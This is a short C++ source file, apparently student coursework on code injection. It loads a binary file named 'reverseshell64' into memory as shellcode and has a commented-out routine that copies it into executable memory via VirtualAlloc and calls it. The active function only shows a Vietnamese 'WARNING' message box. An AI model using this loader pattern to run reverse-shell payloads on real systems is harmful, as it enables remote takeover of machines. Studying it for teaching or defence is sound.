#include "pch.h"
#include "Header.h"
#include <iostream>
#include <Windows.h>
#include <fstream>
using namespace std;

int option, shellSize = 0;
char* shellcode;
std::string filePath = "D:\\Tailieu\\UIT\\ATKTHT\\Injection\\reverseshell64";

int LoadShellCode() {
	std::ifstream myfile(filePath, std::ios::in | std::ios::binary | std::ios::ate);
	std::streampos size;
	if (myfile.is_open())
	{
		size = myfile.tellg();
		shellcode = new char[size];
		myfile.seekg(0, std::ios::beg);
		myfile.read(shellcode, size);
		shellSize = size;
		myfile.close();
		return 0;
	}
	return 1;
}
int execShellCode() {
	/*LoadShellCode();
	void* exec = VirtualAlloc(0, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, shellSize);
	((void(*)())exec)();*/
	LPCWSTR msg = L"Toang roi ban oi";
	LPCWSTR title = L"WARNING";
	MessageBox(NULL, msg, title, MB_OK);
	return 0;
}